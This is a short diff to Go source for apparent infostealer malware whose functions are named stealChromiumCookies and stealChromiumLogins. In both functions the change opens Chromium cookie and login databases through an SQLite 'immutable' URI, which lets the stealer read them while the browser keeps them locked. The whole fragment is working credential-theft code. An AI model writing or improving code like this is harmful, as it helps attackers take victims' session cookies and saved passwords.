@@ -176,7 +176,8 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			defer os.Remove(tmpPath + "-wal")
 			defer os.Remove(tmpPath + "-shm")
 		} else {
-			dbPath = cookiePath
+			clean := strings.ReplaceAll(cookiePath, string(os.PathSeparator), "/")
+			dbPath = "file:" + clean + "?immutable=1"
 		}
 
 		type queryResult struct {
@@ -258,7 +259,8 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			dbPath = tmpPath
 			defer os.Remove(tmpPath)
 		} else {
-			dbPath = loginPath
+			clean := strings.ReplaceAll(loginPath, string(os.PathSeparator), "/")
+			dbPath = "file:" + clean + "?immutable=1"
 		}
 
 		ch := make(chan string, 1)
